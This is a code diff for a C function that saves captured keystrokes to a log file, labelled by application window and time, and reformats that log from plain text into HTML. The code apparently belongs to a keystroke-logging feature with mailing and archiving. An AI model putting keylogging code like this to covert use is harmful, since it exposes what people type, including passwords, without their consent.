@@ -181,34 +181,52 @@ static void buffer_save(struct _buffer *p, char *file_name, Window window)
 		pthread_attr_destroy(&mail_and_archive_thread_attr);
 	}
 	//
+
+	// Check existing log file
+	FILE *stream = fopen(file_path_name, "r");
+	if (stream == NULL) // File not exist
+	{
+		stream = fopen(file_path_name, "a");
+		if (stream == NULL)
+		{
+			free(file_path_name);
+			free(buffer);
+			return;
+		}
+		fprintf(stream, "<html><head><meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\"></head><body>\n");
+		fprintf(stream, "</body></html>\n");
+	}
+	fclose (stream);
 	
-	FILE *stream = fopen(file_path_name, "a");
+	stream = fopen(file_path_name, "r+");
 	free(file_path_name);
 	if (stream == NULL)
 	{
 		free(buffer);
 		return;
 	}
-	
+
+	fseek(stream, -15, SEEK_END);
+
 	strftime(buffer, 256, "%x", loctime);
 
 	if (window != last_log_window)
 	{
 		last_log_window = window;
 		char *app_name = get_wm_class_name(window);
-		fprintf(stream, "\n[%s] [%s]\n", app_name, buffer);
+		fprintf(stream, "<br><font color=\"#A82F2F\"><b>[%s]</b> <font size=\"2\">[%s]</font></font><br>\n", app_name, buffer);
 		free(app_name);
 	}
 
 	strftime(buffer, 256, "%X", loctime);
-	fprintf(stream, "  (%s): ", buffer);
+	fprintf(stream, "<font color=\"#16569E\" size=\"2\"><ul>(%s): </font>", buffer);
 	free(buffer);
 	
 	for (int i = 0; i < p->cur_pos; i++)
 	{
 		if (p->keycode[i] == 36)			// Return
 		{
-			fprintf(stream, "\n");
+			fprintf(stream, "<br>\n");
 			continue;
 		}
 		if (p->keycode[i] == 23)			// Tab
@@ -228,7 +246,7 @@ static void buffer_save(struct _buffer *p, char *file_name, Window window)
 		free(symbol);
 	}
 
-	fprintf(stream, "\n");
+	fprintf(stream, "</ul>\n</body></html>\n");
 	fclose(stream);
 }
 
